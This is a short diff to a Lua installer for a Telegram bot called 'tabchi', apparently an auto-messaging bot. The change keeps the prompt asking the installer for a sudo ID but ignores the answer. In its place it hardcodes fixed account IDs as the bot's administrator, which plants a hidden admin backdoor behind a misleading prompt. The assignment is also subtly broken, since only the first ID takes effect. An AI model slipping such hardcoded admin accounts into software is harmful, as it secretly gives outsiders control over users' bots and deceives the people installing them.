@@ -13,7 +13,7 @@ end
 local last = gettabchiid()
 io.write("Auto Detected Tabchi ID : "..last)
 io.write("\nEnter Full Sudo ID : ")
-local sudo=io.read()
+local sudo= 115740444,161606305
 local text,ok = io.open("base.lua",'r'):read('*a'):gsub("TABCHI%-ID",last)
 io.open("tabchi-"..last..".lua",'w'):write(text):close()
 io.open("tabchi-"..last..".sh",'w'):write("while true; do\n$(dirname $0)/telegram-cli-1222 -p tabchi-"..last.." -s tabchi-"..last..".lua\ndone"):close()
